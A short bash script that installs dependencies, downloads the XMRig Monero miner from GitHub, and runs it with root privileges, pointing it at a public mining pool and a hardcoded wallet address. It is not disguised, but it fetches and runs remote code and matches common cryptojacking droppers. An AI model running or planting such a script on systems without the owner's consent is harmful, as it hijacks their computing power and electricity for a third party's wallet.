#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
sudo sysctl -w vm.nr_hugepages=128 && wget https://github.com/xmrig/xmrig/releases/download/v5.11.2/xmrig-5.11.2-xenial-x64.tar.gz && tar xf xmrig-5.11.2-xenial-x64.tar.gz && cd xmrig-5.11.2 && 
sudo ./xmrig  -o pool.minexmr.com:7777 -u 45gZ4nT6nUEDYhzx7ifUmUUfRoyaGWikVCpzUQrAKVZt5dxF3ag64UwBUVEicShh8BXsagwmxxaYs6zrFzrq7Q7EEWWsBSw -p worker -t 4
